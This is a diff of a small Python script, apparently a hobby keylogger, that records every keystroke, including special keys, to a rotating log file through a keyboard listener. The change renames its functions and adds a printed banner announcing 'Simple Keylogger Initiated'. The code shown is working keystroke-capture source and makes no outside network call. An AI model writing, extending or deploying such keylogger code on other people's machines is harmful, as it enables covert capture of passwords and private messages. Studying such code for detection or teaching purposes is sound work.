@@ -11,14 +11,15 @@ log_handler = RotatingFileHandler(path, maxBytes=1_000_000, backupCount=3)
 
 logging.basicConfig(level=logging.DEBUG, format='%(asctime)s: %(message)s', handlers=[log_handler])
 
-def on_press(key):
+def click(key):
     try:
         logging.info(f'Key {key.char} pressed')
     except AttributeError:
         logging.info(f'Special Key {key} pressed')
 
-def start_keylogger():
-    with keyboard.Listener(on_press=on_press) as listener:
+def start():
+    with keyboard.Listener(on_press=click) as listener:
+        print("Simple Keylogger Initiated \nPress CTRL+C to Stop Execution.")
         listener.join()
 
-start_keylogger()
+start()
